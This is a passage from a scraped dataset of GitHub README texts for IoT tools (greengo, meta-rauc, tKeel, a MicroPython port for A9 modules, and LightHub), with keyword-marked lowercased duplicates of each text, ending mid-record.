\"check\" section below.\nprofit !\nwork on it: create, change or remove lambda functions, subscriptions, resources, and then update greengrass.\n$ greengo update\napply your changes by deploying it again:\n$ greengo deploy\nclean-up when done playing.\nremove the group definitions on aws:\n$ greengo remove\nditch the vagrant vm:\n$ vagrant destroy\nfor any of the above commands you may specify a different yaml file using\n$ greengo --config_file <name>.yaml <command>\nwhere <name> is the name of your yaml and <command> is whatever you wish to run\nnote: if you want to create a new group but keep the greengrass core in the same vagrant vm, you must update it with newly generated certificates and config.json file before deploying the group, and also reset deployment by getting the deployments/group/group.json back to virgin.\nto do it: login to the greengrass vagrant vm and run /vagrant/scripts/update_ggc.sh on the vagrant vm.\ndetails\ncheck the deployment\nhow to be sure everything something works? follow this:\ncreate greengrass group in aws iot: greengo create.\nprepare ggc on the vm: update certificates, reset group.json, restart the greengrassd.\ndeploy with greengo deploy. check:\ncheck the deployment status, should be 'success'\nexplore greengrass core on your vagrant vm.\nlogin to vagrant vm. you should nkow vagrant but for the off case: vagrant ssh.\ncheck the ggc logs runtime.log and python_runtime.log under /greengrass/ggc/var/log/system. runtime log should have a line about starting your lambda, or an error why the funtion is not started. in many cases (like not enough memory for lambda), the deployment is 'success' but the function fails to start. the errors can only be seen in the runtime.log. if the function starts successfully, runtime.log will contain a message like\n[2018-03-31t08:48:40.57z][info]-starting worker arn:aws:lambda:us-west-2:0000000000:function:greengrasshelloworld:12\nfind and check your own lambda log under /greengrass/ggc/var/log/system.\ncheck the greengrassd process: ps aux | grep greengrassd. depending on deployment you might have several processes.\nin aws console, check the mqtt topic with iot mqtt test page:\nregion=`aws configure get region`; open https://$region.console.aws.amazon.com/iot/home?region=$region#/test\nsubscribe to the topic (e.g., hello/world), see the messages sent by the greengrass lambda function.\nwhen something goes wrong\nat this time greengo is just a prototype, a work-in-progress. therefore it's not if but when somethings throws out, leaving the setup in half-deployed, and you gotta pick up the pieces. remember:\nyou are still not worse off doing this manually: you at least have all the arn and id of all resources to clean-up.\ndon't delete .gg/gg_state.json file: it contains references to everything you need to delete. copy it somewhere and use the id and arn of created resources to clean up the pieces.\ndo what it takes to roll forward - if you're close to successful deployment, or roll-back - to clean things up and start from scratch.\nplease pay forward: pr a patch to whatever broke for you to prevent it from happening again.\ndevelopment\nclone the project, set up your environment, install dependencies and setup greengo cli in dev mode:\n$ git clone https://github.com/dzimine/greengo.git\n$ cd greengo\n$ virtualenv venv\n$ . venv/bin/activate\n$ pip install -r requirements.txt\n$ pip install -e .\nrun the unit tests:\npytest -s", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000619, "year": null}, {"Unnamed: 0": 622, "autor": 622, "date": null, "content": "The meta-rauc layer provides support for integrating the RAUC update tool into your device.\nPlease see the corresponding sections below for more information. For a detailed description on steps necessary to integrate RAUC into your project, refer https://rauc.readthedocs.io/en/latest/integration.html.\nDependencies\nThis layer depends on:\nURI: https://github.com/openembedded/bitbake.git\nbranch: master\nURI: https://github.com/openembedded/openembedded-core.git\nlayers: meta\nbranch: master\nFor rauc-hawkbit client:\nURI: https://github.com/openembedded/meta-openembedded.git\nlayers: meta-python\nbranch: master\nFor fuse-support in casync (the default):\nURI: https://github.com/openembedded/meta-openembedded.git\nlayers: meta-filesystems\nbranch: master\nPatches\nPlease submit patches via GitHub pull request on https://github.com/rauc/meta-rauc\nMaintainer: Enrico Joerns <ejo@pengutronix.de>\nI. Adding the rauc Layer to Your Build\nIn order to use this layer, you need to make the build system aware of it.\nAssuming the rauc layer exists at the top-level of your yocto build tree, you can add it to the build system by adding the location of the rauc layer to bblayers.conf, along with any other layers needed. e.g.:\nBBLAYERS ?= \" \\\n/path/to/yocto/meta \\\n/path/to/yocto/meta-poky \\\n/path/to/yocto/meta-yocto-bsp \\\n/path/to/yocto/meta-rauc \\\n\"\nII. Building RAUC Host Tool\nIf you only intend to build the RAUC host tool, you may simply run:\nbitbake rauc-native\nThis will place the rauc binary at tmp/deploy/tools/rauc.\nIf you need to execute the casync host tool manually, you can do this by running:\nbitbake casync-native -caddto_recipe_sysroot\noe-run-native casync-native casync --help\nIII. Adding the RAUC Update Service to Your Device\nTo prepare your device for using RAUC as its update handler, you have to follow at least the following steps:\nAdd rauc to DISTRO_FEATURES in your distro (or local) config:\nDISTRO_FEATURES += \"rauc\"\nAdd a rauc_%.bbappend in your device-specific (BSP) layer that installs your RAUC system configuration file under /etc/rauc/system.conf. For information on how to write the RAUC update file, please refer to the RAUC user documentation [1]:\nFILESEXTRAPATHS:prepend := \"${THISDIR}/files:\"\nSRC_URI:append := \" file://system.conf\"\nCreate a bundle recipe for your device by adding a recipe that inherits the bundle class and adds all desired configuration:\ninherit bundle\nRAUC_BUNDLE_SLOTS = \"rootfs\"\nRAUC_SLOT_rootfs = \"my-rootfs-recipe\"\nRAUC_KEY_FILE = \"path/to/development-1.key.pem\"\nRAUC_CERT_FILE = \"path/to/development-1.cert.pem\"\nFor information on how to generate and use the key and certificate files, please refer to the RAUC user documentation [1].\nFor a more detailed explanation on the required and available variables, read the notes in the bundle.bbclass file.\nBuild a bundle and the rootfs for your device:\nbitbake my-bundle-recipe\nNote: If you do not use packagegroup-base, you als need to manually add the rauc package to your systems image recipe:\nIMAGE_INSTALL:append = \" rauc\"\nIV. Building The RAUC hawkBit Clients\nThis layer offers support for two clients that interface between RAUC and the hawkBit deployment server:\nrauc-hawkbit (python implementation)\nrauc-hawkbit-updater (C implementation)\nTo use rauc-hawkbit as a standalone service add to your systems image recipe:\nIMAGE_INSTALL:append = \" rauc-hawkbit-service\"\nTo use it as a python library in your demo application instead, simply add to your recipe:\nDEPENDS += \"rauc-hawkbit\"\nTo use rauc-hawkbit-updater in your system add to your image recipe:\nIMAGE_INSTALL:append = \" rauc-hawkbit-updater\"\nV. Configure Custom Kernel\nIn order to use RAUC on your system, the kernel must support SquashFS and loop mounts. For the standard yocto kernel, the meta-rauc layer provides a kernel configuration fragment that enables the config options required for this.\nIf you build your own kernel with a full custom defconfig file, you have to make sure that the options in recipes-kernel/linux/linux-yocto/rauc.cfg are enabled in your configuration, too.\nVI. References\n[1](1, 2) http://rauc.readthedocs.io/en/latest/", "link": "https://github.com/rauc/meta-rauc", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "the meta-rauc layer provides support for integrating the rauc update -----> tool !!!  into your device.\nplease see the corresponding sections below for more information. for a detailed description on steps necessary to integrate rauc into your project, refer https://rauc.readthedocs.io/en/latest/integration.html.\ndependencies\nthis layer depends on:\nuri: https://github.com/openembedded/bitbake.git\nbranch: master\nuri: https://github.com/openembedded/openembedded-core.git\nlayers: meta\nbranch: master\nfor rauc-hawkbit client:\nuri: https://github.com/openembedded/meta-openembedded.git\nlayers: meta-python\nbranch: master\nfor fuse-support in casync (the default):\nuri: https://github.com/openembedded/meta-openembedded.git\nlayers: meta-filesystems\nbranch: master\npatches\nplease submit patches via github pull request on https://github.com/rauc/meta-rauc\nmaintainer: enrico joerns <ejo@pengutronix.de>\ni. adding the rauc layer to your build\nin order to use this layer, you need to make the build system aware of it.\nassuming the rauc layer exists at the top-level of your yocto build tree, you can add it to the build system by adding the location of the rauc layer to bblayers.conf, along with any other layers needed. e.g.:\nbblayers ?= \" \\\n/path/to/yocto/meta \\\n/path/to/yocto/meta-poky \\\n/path/to/yocto/meta-yocto-bsp \\\n/path/to/yocto/meta-rauc \\\n\"\nii. building rauc host tool\nif you only intend to build the rauc host tool, you may simply run:\nbitbake rauc-native\nthis will place the rauc binary at tmp/deploy/tools/rauc.\nif you need to execute the casync host tool manually, you can do this by running:\nbitbake casync-native -caddto_recipe_sysroot\noe-run-native casync-native casync --help\niii. adding the rauc update service to your device\nto prepare your device for using rauc as its update handler, you have to follow at least the following steps:\nadd rauc to distro_features in your distro (or local) config:\ndistro_features += \"rauc\"\nadd a rauc_%.bbappend in your device-specific (bsp) layer that installs your rauc system configuration file under /etc/rauc/system.conf. for information on how to write the rauc update file, please refer to the rauc user documentation [1]:\nfilesextrapaths:prepend := \"${thisdir}/files:\"\nsrc_uri:append := \" file://system.conf\"\ncreate a bundle recipe for your device by adding a recipe that inherits the bundle class and adds all desired configuration:\ninherit bundle\nrauc_bundle_slots = \"rootfs\"\nrauc_slot_rootfs = \"my-rootfs-recipe\"\nrauc_key_file = \"path/to/development-1.key.pem\"\nrauc_cert_file = \"path/to/development-1.cert.pem\"\nfor information on how to generate and use the key and certificate files, please refer to the rauc user documentation [1].\nfor a more detailed explanation on the required and available variables, read the notes in the bundle.bbclass file.\nbuild a bundle and the rootfs for your device:\nbitbake my-bundle-recipe\nnote: if you do not use packagegroup-base, you als need to manually add the rauc package to your systems image recipe:\nimage_install:append = \" rauc\"\niv. building the rauc hawkbit clients\nthis layer offers support for two clients that interface between rauc and the hawkbit deployment server:\nrauc-hawkbit (python implementation)\nrauc-hawkbit-updater (c implementation)\nto use rauc-hawkbit as a standalone service add to your systems image recipe:\nimage_install:append = \" rauc-hawkbit-service\"\nto use it as a python library in your demo application instead, simply add to your recipe:\ndepends += \"rauc-hawkbit\"\nto use rauc-hawkbit-updater in your system add to your image recipe:\nimage_install:append = \" rauc-hawkbit-updater\"\nv. configure custom kernel\nin order to use rauc on your system, the kernel must support squashfs and loop mounts. for the standard yocto kernel, the meta-rauc layer provides a kernel configuration fragment that enables the config options required for this.\nif you build your own kernel with a full custom defconfig file, you have to make sure that the options in recipes-kernel/linux/linux-yocto/rauc.cfg are enabled in your configuration, too.\nvi. references\n[1](1, 2) http://rauc.readthedocs.io/en/latest/", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000622, "year": null}, {"Unnamed: 0": 630, "autor": 630, "date": null, "content": "tKeel\nNext-generation IoT open source platform\nHigh performance, High security and easy to use\ntKeel is a strong and reusable IoT platform that helps you build solutions quickly.\nThe architecture is based on a microservices model, providing a pluggable architecture and a data plane that is stable and quick responsive.\nSolving the difficult problems of building an application with high performance, from device to application, modular access, etc.\n\u4e2d\u6587\n\ud83c\udfc3\ud83c\udffb\u200d\u2640\ufe0f Let's Start\nQuick installation of the tKeel platform via the CLI tool\nExample will help you quickly understand how to use our tKeel IoT Open Platform.\nThe official website documentation will have details, from installation to usage details.\n\ud83e\ude9c Architecture\nPerhaps you are interested in the tKeel IoT platform, let me give you a brief introduction.\nArchitecture\nResource\nSomething related to data storage, which can be any database you use.\nCore\nLike the name suggests, this is the data core of the entire platform, providing some form of data organisation as well as processing methods.\nProvides different forms in which data can be organised such as time series, attribute, relationships, etc., making data into easily understood objects that can be easily constructed and developed.\nData interaction is resolved by means of snapshots and subscriptions (Event data).\nService\nProvides the pluggable capability that applications need, plus some core functionality (message routing, tenant management, rights control).\nInterface\nEasy tools and friendly interfaces to Application through encapsulation.\nApplication\nApplications of different volumes; can be everything your existing platform has to offer.\nExisting platforms can simply use the data they need by calling the API provided by Interface.\n\u2705 Reasons to Trust Us\n\ud83e\udd5b Keep it Simple\nThe tKeel platform summarises the generic problems encountered in IoT development over the years, as well as some tough challenges; finally there is this open platform that can solve the pain points in IoT development.\ntKeel is good at dealing with data flow and abstraction in distributed systems, shielding the underlying complexity and providing simpler, more developer-oriented abstractions outwards to help users *quickly build IoT solutions.\n\u26d3\ufe0f Lightweight, but Powerful\nThe tKeel IoT Open Platform is based on microservices architecture, is not vendor-bound and offers an efficient development approach that is scalable, reliable and high performance.\nWith the power of Dapr, a simpler abstraction is provided to the user in the form of sidecar, interacting via HTTP and gRPC.\nThe tKeel platform allows your code to ignore the hosted environment, allowing device docked applications/plugins highly portable and not restricted by programming language, allowing developers to develop to their heart's content using their preferred technology stack.\n\ud83d\udd0c Pluginisation\nThe Plugin implementation is based on the OpenAPI convention, making deployment simple and lightweight through a cloud-native approach.\nThe plugin mechanism makes it easy to reuse plugins that you or others have made public.\nWe provide an Official Plugin Repository where developers can pick and choose plugins for their own scenarios. Of course, if you can make your plugins publicly available, developers with similar needs would appreciate it.\nWith Plugin Guide you will find that implementing plugins is a very simple task.\n\ud83d\udcca Focus on Data\nThe tKeel IoT Open Platform defines data entities through a data centre (tKeel-io/Core ) and simulates and abstracts real-world objects (things).\nYou can define relational mappings for more, faster and easier data refinement through the platform's powerful capabilities.\nWith the design of data entities, we can adapt this abstract design to messages, measurement points, objects and relationships, and the platform provides multi-level and multi-latitude data services.\nConfiguring relational mapping eliminates the need to remember complex Message Topics and Message Formats as we provide a high performance data processing solution.\n\ud83d\udee3\ufe0f Roadmap\nWe have planned a roadmap to do more support for the project.\n\ud83d\udcac Shall We Talk\nIf you have any suggestions or ideas, you are welcome to file an Issue at any time, we'll look forward to sharing them together to make the world a better place.\nThank you very much for your feedback and suggestions!\nCommunity Documents will give you an idea of how you can start contributing to tKeel.\n\ud83d\ude4c Contributing\nThe Development Guide explains how to configure your development environment.\nWe have this [Code of Conduct] that we expect project participants to follow. Please read it in full so that you know what will and will not be tolerated.\n\ud83c\udf1f Find Us\nYou may have many questions, and we will ensure that they are answered as soon as possible!\nSocial Platforms Links\nemail tkeel@yunify.com\nWeibo @tkeel\n\ud83c\udfd8\ufe0f Repos\nrepo Descriptions\ntKeel As what you see, the code for the platform and an overview of the platform are included\nCLI The tKeel CLI is the main tool for various tKeel-related tasks\nHelm Helm charts corresponding to tKeel\nCore tKeel's data centre", "link": "https://github.com/tkeel-io/tkeel", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "tkeel\nnext-generation iot open source platform\nhigh performance, high security and easy to use\ntkeel is a strong and reusable iot platform that helps you build solutions quickly.\nthe architecture is based on a microservices model, providing a pluggable architecture and a data plane that is stable and quick responsive.\nsolving the difficult problems of building an application with high performance, from device to application, modular access, etc.\n\u4e2d\u6587\n\ud83c\udfc3\ud83c\udffb\u200d\u2640\ufe0f let's start\nquick installation of the tkeel platform via the cli -----> tool !!! \nexample will help you quickly understand how to use our tkeel iot open platform.\nthe official website documentation will have details, from installation to usage details.\n\ud83e\ude9c architecture\nperhaps you are interested in the tkeel iot platform, let me give you a brief introduction.\narchitecture\nresource\nsomething related to data storage, which can be any database you use.\ncore\nlike the name suggests, this is the data core of the entire platform, providing some form of data organisation as well as processing methods.\nprovides different forms in which data can be organised such as time series, attribute, relationships, etc., making data into easily understood objects that can be easily constructed and developed.\ndata interaction is resolved by means of snapshots and subscriptions (event data).\nservice\nprovides the pluggable capability that applications need, plus some core functionality (message routing, tenant management, rights control).\ninterface\neasy tools and friendly interfaces to application through encapsulation.\napplication\napplications of different volumes; can be everything your existing platform has to offer.\nexisting platforms can simply use the data they need by calling the api provided by interface.\n\u2705 reasons to trust us\n\ud83e\udd5b keep it simple\nthe tkeel platform summarises the generic problems encountered in iot development over the years, as well as some tough challenges; finally there is this open platform that can solve the pain points in iot development.\ntkeel is good at dealing with data flow and abstraction in distributed systems, shielding the underlying complexity and providing simpler, more developer-oriented abstractions outwards to help users *quickly build iot solutions.\n\u26d3\ufe0f lightweight, but powerful\nthe tkeel iot open platform is based on microservices architecture, is not vendor-bound and offers an efficient development approach that is scalable, reliable and high performance.\nwith the power of dapr, a simpler abstraction is provided to the user in the form of sidecar, interacting via http and grpc.\nthe tkeel platform allows your code to ignore the hosted environment, allowing device docked applications/plugins highly portable and not restricted by programming language, allowing developers to develop to their heart's content using their preferred technology stack.\n\ud83d\udd0c pluginisation\nthe plugin implementation is based on the openapi convention, making deployment simple and lightweight through a cloud-native approach.\nthe plugin mechanism makes it easy to reuse plugins that you or others have made public.\nwe provide an official plugin repository where developers can pick and choose plugins for their own scenarios. of course, if you can make your plugins publicly available, developers with similar needs would appreciate it.\nwith plugin guide you will find that implementing plugins is a very simple task.\n\ud83d\udcca focus on data\nthe tkeel iot open platform defines data entities through a data centre (tkeel-io/core ) and simulates and abstracts real-world objects (things).\nyou can define relational mappings for more, faster and easier data refinement through the platform's powerful capabilities.\nwith the design of data entities, we can adapt this abstract design to messages, measurement points, objects and relationships, and the platform provides multi-level and multi-latitude data services.\nconfiguring relational mapping eliminates the need to remember complex message topics and message formats as we provide a high performance data processing solution.\n\ud83d\udee3\ufe0f roadmap\nwe have planned a roadmap to do more support for the project.\n\ud83d\udcac shall we talk\nif you have any suggestions or ideas, you are welcome to file an issue at any time, we'll look forward to sharing them together to make the world a better place.\nthank you very much for your feedback and suggestions!\ncommunity documents will give you an idea of how you can start contributing to tkeel.\n\ud83d\ude4c contributing\nthe development guide explains how to configure your development environment.\nwe have this [code of conduct] that we expect project participants to follow. please read it in full so that you know what will and will not be tolerated.\n\ud83c\udf1f find us\nyou may have many questions, and we will ensure that they are answered as soon as possible!\nsocial platforms links\nemail tkeel@yunify.com\nweibo @tkeel\n\ud83c\udfd8\ufe0f repos\nrepo descriptions\ntkeel as what you see, the code for the platform and an overview of the platform are included\ncli the tkeel cli is the main tool for various tkeel-related tasks\nhelm helm charts corresponding to tkeel\ncore tkeel's data centre", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000630, "year": null}, {"Unnamed: 0": 642, "autor": 642, "date": null, "content": "Important\nThis repo is only for porting micropython to the GPS+GSM modules A9 and A9G. Go to the port page or visit the MicroPython project page.\nThe build status displays that of the original repo.\nThe MicroPython project\nThis is the MicroPython project, which aims to put an implementation of Python 3.x on microcontrollers and small embedded systems. You can find the official website at micropython.org.\nWARNING: this project is in beta stage and is subject to changes of the code-base, including project-wide name changes and API changes.\nMicroPython implements the entire Python 3.4 syntax (including exceptions, with, yield from, etc., and additionally async/await keywords from Python 3.5). The following core datatypes are provided: str (including basic Unicode support), bytes, bytearray, tuple, list, dict, set, frozenset, array.array, collections.namedtuple, classes and instances. Builtin modules include sys, time, and struct, etc. Select ports have support for _thread module (multithreading). Note that only a subset of Python 3 functionality is implemented for the data types and modules.\nMicroPython can execute scripts in textual source form or from precompiled bytecode, in both cases either from an on-device filesystem or \"frozen\" into the MicroPython executable.\nSee the repository http://github.com/micropython/pyboard for the MicroPython board (PyBoard), the officially supported reference electronic circuit board.\nMajor components in this repository:\npy/ -- the core Python implementation, including compiler, runtime, and core library.\nmpy-cross/ -- the MicroPython cross-compiler which is used to turn scripts into precompiled bytecode.\nports/unix/ -- a version of MicroPython that runs on Unix.\nports/stm32/ -- a version of MicroPython that runs on the PyBoard and similar STM32 boards (using ST's Cube HAL drivers).\nports/minimal/ -- a minimal MicroPython port. Start with this if you want to port MicroPython to another microcontroller.\ntests/ -- test framework and test scripts.\ndocs/ -- user documentation in Sphinx reStructuredText format. Rendered HTML documentation is available at http://docs.micropython.org.\nAdditional components:\nports/bare-arm/ -- a bare minimum version of MicroPython for ARM MCUs. Used mostly to control code size.\nports/teensy/ -- a version of MicroPython that runs on the Teensy 3.1 (preliminary but functional).\nports/pic16bit/ -- a version of MicroPython for 16-bit PIC microcontrollers.\nports/cc3200/ -- a version of MicroPython that runs on the CC3200 from TI.\nports/esp8266/ -- a version of MicroPython that runs on Espressif's ESP8266 SoC.\nports/esp32/ -- a version of MicroPython that runs on Espressif's ESP32 SoC.\nports/nrf/ -- a version of MicroPython that runs on Nordic's nRF51 and nRF52 MCUs.\nextmod/ -- additional (non-core) modules implemented in C.\ntools/ -- various tools, including the pyboard.py module.\nexamples/ -- a few example Python scripts.\nThe subdirectories above may include READMEs with additional info.\n\"make\" is used to build the components, or \"gmake\" on BSD-based systems. You will also need bash, gcc, and Python 3.3+ available as the command python3 (if your system only has Python 2.7 then invoke make with the additional option PYTHON=python2).\nThe MicroPython cross-compiler, mpy-cross\nMost ports require the MicroPython cross-compiler to be built first. This program, called mpy-cross, is used to pre-compile Python scripts to .mpy files which can then be included (frozen) into the firmware/executable for a port. To build mpy-cross use:\n$ cd mpy-cross\n$ make\nThe Unix version\nThe \"unix\" port requires a standard Unix environment with gcc and GNU make. x86 and x64 architectures are supported (i.e. x86 32- and 64-bit), as well as ARM and MIPS. Making full-featured port to another architecture requires writing some assembly code for the exception handling and garbage collection. Alternatively, fallback implementation based on setjmp/longjmp can be used.\nTo build (see section below for required dependencies):\n$ cd ports/unix\n$ make submodules\n$ make\nThen to give it a try:\n$ ./micropython\n>>> list(5 * x + y for x in range(10) for y in [4, 2, 1])\nUse CTRL-D (i.e. EOF) to exit the shell. Learn about command-line options (in particular, how to increase heap size which may be needed for larger applications):\n$ ./micropython -h\nRun complete testsuite:\n$ make test\nUnix version comes with a builtin package manager called upip, e.g.:\n$ ./micropython -m upip install micropython-pystone\n$ ./micropython -m pystone\nBrowse available modules on PyPI. Standard library modules come from micropython-lib project.\nExternal dependencies\nBuilding MicroPython ports may require some dependencies installed.\nFor Unix port, libffi library and pkg-config tool are required. On Debian/Ubuntu/Mint derivative Linux distros, install build-essential (includes toolchain and make), libffi-dev, and pkg-config packages.\nOther dependencies can be built together with MicroPython. This may be required to enable extra features or capabilities, and in recent versions of MicroPython, these may be enabled by default. To build these additional dependencies, in the port directory you're interested in (e.g. ports/unix/) first execute:\n$ make submodules\nThis will fetch all the relevant git submodules (sub repositories) that the port needs. Use the same command to get the latest versions of submodules as they are updated from time to time. After that execute:\n$ make deplibs\nThis will build all available dependencies (regardless whether they are used or not). If you intend to build MicroPython with additional options (like cross-compiling), the same set of options should be passed to make deplibs. To actually enable/disable use of dependencies, edit ports/unix/mpconfigport.mk file, which has inline descriptions of the options. For example, to build SSL module (required for upip tool described above, and so enabled by default), MICROPY_PY_USSL should be set to 1.\nFor some ports, building required dependences is transparent, and happens automatically. But they still need to be fetched with the make submodules command.\nThe STM32 version\nThe \"stm32\" port requires an ARM compiler, arm-none-eabi-gcc, and associated bin-utils. For those using Arch Linux, you need arm-none-eabi-binutils, arm-none-eabi-gcc and arm-none-eabi-newlib packages. Otherwise, try here: https://launchpad.net/gcc-arm-embedded\nTo build:\n$ cd ports/stm32\n$ make submodules\n$ make\nYou then need to get your board into DFU mode. On the pyboard, connect the 3V3 pin to the P1/DFU pin with a wire (on PYBv1.0 they are next to each other on the bottom left of the board, second row from the bottom).\nThen to flash the code via USB DFU to your device:\n$ make deploy\nThis will use the included tools/pydfu.py script. If flashing the firmware does not work it may be because you don't have the correct permissions, and need to use sudo make deploy. See the README.md file in the ports/stm32/ directory for further details.\nContributing\nMicroPython is an open-source project and welcomes contributions. To be productive, please be sure to follow the Contributors' Guidelines and the Code Conventions. Note that MicroPython is licenced under the MIT license, and all contributions should follow this license.", "link": "https://github.com/pulkin/micropython", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "important\nthis repo is only for porting micropython to the gps+gsm modules a9 and a9g. go to the port page or visit the micropython project page.\nthe build status displays that of the original repo.\nthe micropython project\nthis is the micropython project, which aims to put an implementation of python 3.x on microcontrollers and small embedded systems. you can find the official website at micropython.org.\nwarning: this project is in beta stage and is subject to changes of the code-base, including project-wide name changes and api changes.\nmicropython implements the entire python 3.4 syntax (including exceptions, with, yield from, etc., and additionally async/await keywords from python 3.5). the following core datatypes are provided: str (including basic unicode support), bytes, bytearray, tuple, list, dict, set, frozenset, array.array, collections.namedtuple, classes and instances. builtin modules include sys, time, and struct, etc. select ports have support for _thread module (multithreading). note that only a subset of python 3 functionality is implemented for the data types and modules.\nmicropython can execute scripts in textual source form or from precompiled bytecode, in both cases either from an on-device filesystem or \"frozen\" into the micropython executable.\nsee the repository http://github.com/micropython/pyboard for the micropython board (pyboard), the officially supported reference electronic circuit board.\nmajor components in this repository:\npy/ -- the core python implementation, including compiler, runtime, and core library.\nmpy-cross/ -- the micropython cross-compiler which is used to turn scripts into precompiled bytecode.\nports/unix/ -- a version of micropython that runs on unix.\nports/stm32/ -- a version of micropython that runs on the pyboard and similar stm32 boards (using st's cube hal drivers).\nports/minimal/ -- a minimal micropython port. start with this if you want to port micropython to another microcontroller.\ntests/ -- test framework and test scripts.\ndocs/ -- user documentation in sphinx restructuredtext format. rendered html documentation is available at http://docs.micropython.org.\nadditional components:\nports/bare-arm/ -- a bare minimum version of micropython for arm mcus. used mostly to control code size.\nports/teensy/ -- a version of micropython that runs on the teensy 3.1 (preliminary but functional).\nports/pic16bit/ -- a version of micropython for 16-bit pic microcontrollers.\nports/cc3200/ -- a version of micropython that runs on the cc3200 from ti.\nports/esp8266/ -- a version of micropython that runs on espressif's esp8266 soc.\nports/esp32/ -- a version of micropython that runs on espressif's esp32 soc.\nports/nrf/ -- a version of micropython that runs on nordic's nrf51 and nrf52 mcus.\nextmod/ -- additional (non-core) modules implemented in c.\ntools/ -- various tools, including the pyboard.py module.\nexamples/ -- a few example python scripts.\nthe subdirectories above may include readmes with additional info.\n\"make\" is used to build the components, or \"gmake\" on bsd-based systems. you will also need bash, gcc, and python 3.3+ available as the command python3 (if your system only has python 2.7 then invoke make with the additional option python=python2).\nthe micropython cross-compiler, mpy-cross\nmost ports require the micropython cross-compiler to be built first. this program, called mpy-cross, is used to pre-compile python scripts to .mpy files which can then be included (frozen) into the firmware/executable for a port. to build mpy-cross use:\n$ cd mpy-cross\n$ make\nthe unix version\nthe \"unix\" port requires a standard unix environment with gcc and gnu make. x86 and x64 architectures are supported (i.e. x86 32- and 64-bit), as well as arm and mips. making full-featured port to another architecture requires writing some assembly code for the exception handling and garbage collection. alternatively, fallback implementation based on setjmp/longjmp can be used.\nto build (see section below for required dependencies):\n$ cd ports/unix\n$ make submodules\n$ make\nthen to give it a try:\n$ ./micropython\n>>> list(5 * x + y for x in range(10) for y in [4, 2, 1])\nuse ctrl-d (i.e. eof) to exit the shell. learn about command-line options (in particular, how to increase heap size which may be needed for larger applications):\n$ ./micropython -h\nrun complete testsuite:\n$ make test\nunix version comes with a builtin package manager called upip, e.g.:\n$ ./micropython -m upip install micropython-pystone\n$ ./micropython -m pystone\nbrowse available modules on pypi. standard library modules come from micropython-lib project.\nexternal dependencies\nbuilding micropython ports may require some dependencies installed.\nfor unix port, libffi library and pkg-config -----> tool !!!  are required. on debian/ubuntu/mint derivative linux distros, install build-essential (includes toolchain and make), libffi-dev, and pkg-config packages.\nother dependencies can be built together with micropython. this may be required to enable extra features or capabilities, and in recent versions of micropython, these may be enabled by default. to build these additional dependencies, in the port directory you're interested in (e.g. ports/unix/) first execute:\n$ make submodules\nthis will fetch all the relevant git submodules (sub repositories) that the port needs. use the same command to get the latest versions of submodules as they are updated from time to time. after that execute:\n$ make deplibs\nthis will build all available dependencies (regardless whether they are used or not). if you intend to build micropython with additional options (like cross-compiling), the same set of options should be passed to make deplibs. to actually enable/disable use of dependencies, edit ports/unix/mpconfigport.mk file, which has inline descriptions of the options. for example, to build ssl module (required for upip tool described above, and so enabled by default), micropy_py_ussl should be set to 1.\nfor some ports, building required dependences is transparent, and happens automatically. but they still need to be fetched with the make submodules command.\nthe stm32 version\nthe \"stm32\" port requires an arm compiler, arm-none-eabi-gcc, and associated bin-utils. for those using arch linux, you need arm-none-eabi-binutils, arm-none-eabi-gcc and arm-none-eabi-newlib packages. otherwise, try here: https://launchpad.net/gcc-arm-embedded\nto build:\n$ cd ports/stm32\n$ make submodules\n$ make\nyou then need to get your board into dfu mode. on the pyboard, connect the 3v3 pin to the p1/dfu pin with a wire (on pybv1.0 they are next to each other on the bottom left of the board, second row from the bottom).\nthen to flash the code via usb dfu to your device:\n$ make deploy\nthis will use the included tools/pydfu.py script. if flashing the firmware does not work it may be because you don't have the correct permissions, and need to use sudo make deploy. see the readme.md file in the ports/stm32/ directory for further details.\ncontributing\nmicropython is an open-source project and welcomes contributions. to be productive, please be sure to follow the contributors' guidelines and the code conventions. note that micropython is licenced under the mit license, and all contributions should follow this license.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000642, "year": null}, {"Unnamed: 0": 646, "autor": 646, "date": null, "content": "LightHub\nis Flexible, Arduino-Mega/Arduino DUE/ESP8266/ESP32 open-software and open-hardware SmartHome controller. RU HOME-site RU It may operate both:\nOn especially designed hardware board with 16 optocoupled digital inputs, 16 ESD protected digital/analog Inputs/outputs, 8 open-collector outputs (up to 0.5A/50V), DMX IN/OUT, MODBUS RTU and hardware 1-wire support circuit.\nOn plain Arduino MEGA 2560, Arduino DUE, ESP8266, ESP32 and even on Controllino (Controllino is not tested enough)\nLighthub allows connecting together:\nContact sensors (switches, buttons etc)\nAnalog sensors (Leak detectors, Knobs etc)\n1-Wire temperature sensors (up to 20 on single bus)\nTemperature/Humidity/CO2 sensors: DHT22, CS811, HDC1080 and any type of Modbus connected devices\nStandard nonexpensive Relay board with TTL inputs, like this to control AC powered lamps, floor heaters, boilers etc\nStandard nonexpensive LED dimmers and AC DMX-512 dimmers\nModbus RTU devices (Currently, possible to control two types of Modbus devices: AC Dimmer and Ventilation set (Based on Vacon 10 controller) and configure polling of virtually any Modbus device.\nSimple DMX wall sensor panel like this\nList of non-expensive compatible components from AliExpress here\nWhere is possible both, to configure local control/mapping between inputs and outputs (light, floor heating thermostats) and remote control from MQTT enabled software and between controllers. At the moment, LightHub tested and perfectly working with following set of complementary free software:\nHomeAssistant - the best choice of HomeAutomation system\nOpenhab or Openhab2 Smarthome software Openhab provides own native mobile app both, for IoS and Android, and even allow you to use Apple's HomeKit and Google Home to say \"Siri, turn on light in bedroom\" or \"Hey Google, set bedroom light to Red\" but requires some server to be installed in-premises (Raspberry PI with Openhabian will good enough)\nHomeRemote mobile client Home Remote mobile applicatios for IoS and Android requires just MQTT broker to be working. Any Cloud-based MQTT broker, like CloudMQTT will enough to serve average household, even with free account.\nNode-Red Possibly, the best solution to deploy event-based authomation and scripting on top of MQTT/LightHub. The easy to use universal and visual tool to wire many different devices in single system. Having own Dashbord which allow control from web/mobile web, even without mobile apps (excelent co-working 